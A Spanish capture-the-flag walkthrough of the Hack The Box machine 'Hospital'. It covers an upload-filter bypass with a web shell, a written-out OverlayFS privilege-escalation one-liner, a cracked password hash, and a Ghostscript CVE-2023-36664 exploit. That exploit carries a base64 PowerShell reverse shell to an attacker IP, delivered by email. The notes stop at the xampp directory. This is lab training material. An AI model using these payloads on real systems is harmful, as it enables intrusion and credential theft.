Hacemos el escaneo de nmap:
![[Pasted image 20240605193427.png]]
Vemos el dominio hospital.htb, por lo que lo añadimos en el /etc/hosts:
![[Pasted image 20240605193247.png]]
Vemos el puerto 8080 abierto donde corre el protocolo HTTP, por lo que vamos a visualizarlo desde el navegador:
![[Pasted image 20240605193507.png]]
Nos creamos una cuenta:
![[Pasted image 20240605193537.png]]
Y ahora nos logueamos, donde vemos que podemos subir archivos:
![[Pasted image 20240605193603.png]]
Probamos en subir una reverse shell en php:
![[Pasted image 20240605193912.png]]
Pero nos da un error:
![[Pasted image 20240605193935.png]]
Por lo que vamos a probar con el intruder de burp suite en probar muchas posibles extensiones:
![[Pasted image 20240605194105.png]]
Y ponemos las extensiones típicas de php:
![[Pasted image 20240605194132.png]]
Y en la parte de Response, vemos que una de ellas ha funcionado, la .phar:
![[Pasted image 20240605194219.png]]
Vamos a subir la siguiente reverse shell:
```bash
https://github.com/flozz/p0wny-shell/blob/master/shell.php
```
Y la subimos:
![[Pasted image 20240605194420.png]]
Haciendo fuzzing web nos encontramos con el directorio /uploads, donde probablemente se nos haya subido el archivo .phar:
![[Pasted image 20240605195138.png]]
Accedemos a la siguiente ruta:
```bash
http://10.10.11.241:8080/uploads/shell.phar
```
![[Pasted image 20240605195654.png]]
Donde tenemos ejecución remota de comandos:
![[Pasted image 20240605195716.png]]
Nos lanzamos una reverse shell:
![[Pasted image 20240605195813.png]]
Y recibimos la conexión:
![[Pasted image 20240605195839.png]]
No obstante, estamos dentro de un contenedor de docker:
![[Pasted image 20240605195906.png]]
Hay un tutorial donde se nos muestra cómo podemos escalar privilegios en Ubuntu con CVE-2023-2640 & CVE-2023-32629:
```bash
https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?rdt=42259
```
![[Pasted image 20240605200051.png]]
Por lo que probamos en ejecutar el comando id y vemos que lo ejecuta como root:
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;

setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```
![[Pasted image 20240605200324.png]]
Vamos a cambiar el payload, para en vez de poner id, poner algún comando malicioso, que sería un bash -i:
```bash
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
```
Y ya somos root dentro del contenedor:
![[Pasted image 20240605200824.png]]
Si miramos el /etc/shadow podemos ver el hash del usuario drwilliams:
![[Pasted image 20240605200940.png]]
Este hash lo vamos a crackear con john the ripper y habremos obtenido la contraseña:
```bash
drwilliams:qwe123!@#
```
![[Pasted image 20240605201518.png]]
Ahora que ya tenemos estas credenciales, habíamos visto que el puerto 443 también estaba abierto (HTTPS), por lo que lo visualizamos, donde vemos un servicio de correo:
![[Pasted image 20240605201658.png]]
Probamos las credenciales obtenidas y accedemos, donde además hay un correo que dice que debemos enviar unos diseños con extensión eps y compatible con Ghostcript:
![[Pasted image 20240605201744.png]]
Investigando por google vemos que este programa es un intérprete de documentos PostScript y PDF:
![[Pasted image 20240605201910.png]]
Y estamos ante la siguiente vulnerabilidad CVE-2023-36664:
```bash
https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
```
![[Pasted image 20240605202008.png]]
Nos descargamos el exploit y siguiendo las instrucciones genemos el archivo .eps malicioso, pero usando la opción 3 de powershell en revshells.com y en base64:
```bash
python3 CVE_2023_36664_exploit.py --generate --payload 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA0ACIALAA0ADIANAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' --filename virus --extension eps
```
![[Pasted image 20240605204630.png]]
Creamos el archivo malicioso con el exploit:
![[Pasted image 20240605204613.png]]
Ahora contestamos al correo enviando este archivo malicioso:
![[Pasted image 20240605202447.png]]
Y habremos recibido la conexión:
![[Pasted image 20240605204806.png]]
Y mediante el uso del comando ipconfig confirmamos que estamos dentro de la máquina:
![[Pasted image 20240605204937.png]]
Dentro de la raíz del sistema vemos el directorio xampp:
![[Pasted image 20240605205051.png]]

